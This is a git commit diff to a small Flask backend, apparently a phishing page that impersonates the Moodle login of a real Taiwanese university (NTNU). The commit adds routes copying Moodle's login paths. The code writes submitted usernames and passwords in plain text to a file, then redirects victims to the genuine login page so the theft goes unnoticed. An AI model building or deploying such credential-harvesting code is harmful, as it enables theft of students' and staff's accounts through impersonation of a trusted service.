546ddac6c9151687aa7a7b45c0c8cc7954268c5c
theone <oraclelee77@gmail.com>
2024-12-18 19:47:46 +0000

    修改html & 後端

--- moodle/back.py
+++ moodle/back.py
@@ -1,8 +1,10 @@
 from flask import Flask, request, redirect, send_from_directory, render_template_string
 
 app = Flask(__name__)
-
 @app.route('/', methods=['GET', 'POST'])
+@app.route('/login', methods=['GET', 'POST'])
+@app.route('/login/', methods=['GET', 'POST'])
+@app.route('/login/index.php', methods=['GET', 'POST'])
 def index():
     if request.method == 'POST':
         # 獲取用戶輸入的帳號和密碼
@@ -14,10 +16,11 @@ def index():
             f.write(f"Username: {username}, Password: {password}\n")
         
         # 重定向到 Moodle 網站
-        # return redirect("https://moodle3.ntnu.edu.tw/login/index.php")
+        return redirect("https://moodle3.ntnu.edu.tw/login/index.php")
 
     # 返回 index.html
     return send_from_directory('.', 'index.html')
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8080)
+    # debug must be fasle , or you can't run it in background
+    app.run(host='0.0.0.0', port=7777,debug='False')
